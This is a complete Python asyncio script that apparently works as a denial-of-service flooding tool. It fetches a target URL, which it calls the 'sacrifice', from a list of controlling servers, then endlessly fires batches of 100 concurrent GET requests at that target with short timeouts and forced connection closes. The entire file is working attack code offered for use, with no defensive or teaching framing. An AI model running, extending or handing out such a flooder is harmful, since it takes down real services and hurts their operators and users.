import datetime
import asyncio

import aiohttp
from aiohttp import ClientTimeout


def timer(func):
    async def wrapper(*args, **kwargs):
        time_start = datetime.datetime.now()
        print("Start attack")
        result = await func(*args, **kwargs)
        time_finish = datetime.datetime.now()
        print(time_finish - time_start)
        return result
    return wrapper


@timer
async def get(url: str) -> None:

    timeout = ClientTimeout(sock_read=0.5)
    connector = aiohttp.TCPConnector(limit=500, limit_per_host=500,force_close=True)
    async with aiohttp.ClientSession(connector=connector,timeout=timeout) as session:
        task = [asyncio.create_task(session.get(url))
        for i in range(100)]
        await asyncio.gather(*task)


async def get_ip_sacrifice(ips: list) -> str:
    async with aiohttp.ClientSession() as session:

        for ip in ips:
            async with session.get(ip + "/attack_url") as response:
                if response.status == 200:
                    ip_sacrifice = await response.json()
        return ip_sacrifice.get("url")


async def reed_servers_ip() -> list:
    ips_servers = []

    with open("server_ip.txt", "r") as f:
        for line in f.readlines():
            ips_servers.append(line.strip())
    return ips_servers


async def post(url) -> None:
    pass


async def put(url) -> None:
    pass


async def delete(url) -> None:
    pass


async def main():
    ips_servers = await reed_servers_ip()
    ip_sacrifice = await get_ip_sacrifice(ips_servers)

    while True:
        await get(ip_sacrifice)


if __name__ == '__main__':
    asyncio.run(main())
